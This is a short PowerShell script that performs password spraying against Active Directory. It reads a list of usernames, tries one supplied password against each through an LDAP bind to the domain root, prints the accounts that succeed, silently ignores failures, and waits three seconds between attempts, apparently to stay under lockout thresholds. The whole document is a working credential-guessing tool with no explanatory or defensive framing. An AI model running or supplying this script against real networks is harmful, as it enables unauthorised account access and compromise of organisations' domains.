param ([string]$UserListPath, [string]$Password)

$Users = Get-Content -Path $UserListPath

foreach ($User in $Users) {
    $User = $User.Trim()
    if ($User -eq "") { continue }

    $DomainDN = ([ADSI]"LDAP://RootDSE").defaultNamingContext
    $LDAPPath = "LDAP://$DomainDN"

    try {
        $ADSI = New-Object DirectoryServices.DirectoryEntry($LDAPPath, $User, $Password)

        if ($ADSI.Name -ne $null) {
            Write-Host "[+] $User" -ForegroundColor Green
        }
    }
    catch {
    }

    Start-Sleep -Seconds 3
}

Write-Host "[*] Done!" -ForegroundColor Cyan
